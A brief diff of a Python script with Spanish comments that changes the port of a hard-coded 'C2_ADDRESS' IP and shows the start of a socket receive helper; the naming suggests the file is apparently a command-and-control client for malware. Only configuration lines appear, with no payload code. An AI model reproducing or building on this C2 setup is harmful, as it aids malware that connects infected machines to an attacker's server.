@@ -10,7 +10,7 @@ if sys.stdout.encoding != 'UTF-8':
 
 # ─── CONFIGURACIÓN ─────────────────────────────────────────────────────────────
 C2_ADDRESS = "137.74.136.147"
-C2_PORT = 40235
+C2_PORT = 55064
 
 # ─── FUNCIONES SEGURAS ──────────────────────────────────────────────────────────
 def safe_recv(sock, size=1024, timeout=10):
